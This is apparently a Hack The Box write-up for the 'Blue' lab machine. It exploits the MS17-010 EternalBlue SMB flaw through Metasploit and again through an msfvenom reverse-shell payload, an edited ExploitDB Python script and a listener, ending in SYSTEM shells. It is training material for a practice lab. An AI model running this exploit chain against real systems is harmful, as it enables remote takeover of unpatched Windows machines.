<center><h1>Blue</h1></center>
<br><br>
Blue is very simple box that is vulnerable to MS17-010. I will show how to exploit this using only metasploit and then a second way by generating our own payload using ```msfvenom``` combined with a python script.
<br>
<center><h2>Using Metasploit</h2></center>
<br>
Start with an nmap scan
```
# Nmap 7.80 scan initiated Mon Oct 21 23:09:48 2019 as: nmap -sV -sC -T4 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.059s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4h18m55s, deviation: 34m36s, median: -3h58m56s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-10-22T00:11:58+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-10-21T23:11:59
|_  start_date: 2019-10-21T09:24:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 21 23:11:00 2019 -- 1 IP address (1 host up) scanned in 72.43 seconds
```
So a few ports open, most of them useless but SMB is open. We can verify it is vulnerable to eternal blue by using nmap.
```
# nmap --script vuln -p 445 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 00:26 EDT
PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```
Now if we start metasploit and load the exploit we can enter ```show options``` and see that the only information that we really have to enter is the ```RHOST```.
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```
I set the ```RHOST``` to the IP of the box and then hit exploit and am given a shell. If I run ```whoami``` It shows I am the ```NT AUTHORITY/SYSTEM```.
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.39:4444 
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.39:4444 -> 10.10.10.40:49160) at 2019-10-22 00:34:30 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


C:\Windows\system32>whoami
whoami
nt authority\system
```
<br>
<center><h2>Manual Walkthrough</h2></center>
<br><br>
Using ```searchsploit``` we can see the python script that we will be using. We want the second one.
```
# searchsploit "Eternal Blue"
--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                 |  Path
                                                               | (/usr/share/exploitdb/)
--------------------------------------------------------------- ----------------------------------------
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Ex | exploits/windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue | exploits/windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remo | exploits/windows_x86-64/remote/42030.py
--------------------------------------------------------------- ----------------------------------------
```
You can copy it to your current working directory by using the -m option
```
# searchsploit -m exploits/windows/remote/42315.py
```
Now there are a couple steps we have to do before we can actually execute the exploit. First we have to generate our payload.
```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=9999 -f exe > blue.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
```
Next we need to edit the python script. First edit the username variable so it contains two ```//```. This is because the SMB server allows guest login
```
USERNAME = '//'
PASSWORD = ''
```
Lastly, uncomment two lines and edit them to point to the payload that you created.
```
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()
        
        print('creating file c:\\pwned.txt on the target')
        tid2 = smbConn.connectTree('C$')
        fid2 = smbConn.createFile(tid2, '/pwned.txt')
        smbConn.closeFile(tid2, fid2)
        smbConn.disconnectTree(tid2)
        
 ---->  smb_send_file(smbConn, '/root/Documents/HTB2/Blue/blue.exe', 'C', '/blue.exe')
 ---->  service_exec(conn, r'cmd /c c:\\blue.exe')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."
```
Now we need to set up our listener. For this we will use Metasploits ```multi/handler```. Set the LHOST and LPORT to your IP and port you chose when generating your payload and then set the apayload for a windows reverse shell. Type exploit to start the handler.
```
msf5 exploit(multi/handler) > set lhost 10.10.14.39
lhost => 10.10.14.39
msf5 exploit(multi/handler) > set lport 9999
lport => 9999
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.39:9999 
```
Now lets execute the python script
```
# python eternalBlue.py 10.10.10.40 ntsvcs
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
No transaction struct in leak data
leak failed... try again
No transaction struct in leak data
leak failed... try again
CONNECTION: 0xfffffa800405f020
SESSION: 0xfffff8a008df08e0
FLINK: 0xfffff8a000915048
InParam: 0xfffff8a00284b15c
MID: 0x4603
unexpected alignment, diff: 0x-1f36fb8
leak failed... try again
CONNECTION: 0xfffffa800405f020
SESSION: 0xfffff8a008df08e0
FLINK: 0xfffff8a0026dd048
InParam: 0xfffff8a00285715c
MID: 0x4607
unexpected alignment, diff: 0x-17afb8
leak failed... try again
CONNECTION: 0xfffffa800405f020
SESSION: 0xfffff8a008df08e0
FLINK: 0xfffff8a002883088
InParam: 0xfffff8a00287d15c
MID: 0x4703
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service OuBS.....
Starting service OuBS.....
The NETBIOS connection with the remote host timed out.
Removing service OuBS.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
If we go back to the reverse handler we see a meterpreter session has opened
```
[*] Sending stage (180291 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.39:9999 -> 10.10.10.40:49161) at 2019-10-22 01:01:24 -0400

meterpreter > 
```
From here we can use the ```shell``` command to give us a windows shell. We can run ```whoami``` to show that we are indeed ```NT AUTHORITY/SYSTEM```.From here we can grab both the user and root flag.
<br>
The ```user.txt``` flag is located in ```C:\Users\haris\Desktop\user.txt```.
```
C:\Users\haris\Desktop>type user.txt
type user.txt
4c546aea7dbee75c****************
```
The ```root.txt``` flag is located in ```C:\Users\Administrator\Desktop\root.txt```.
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
ff548eb71e920ff6****************
```
<br><br><br><br>

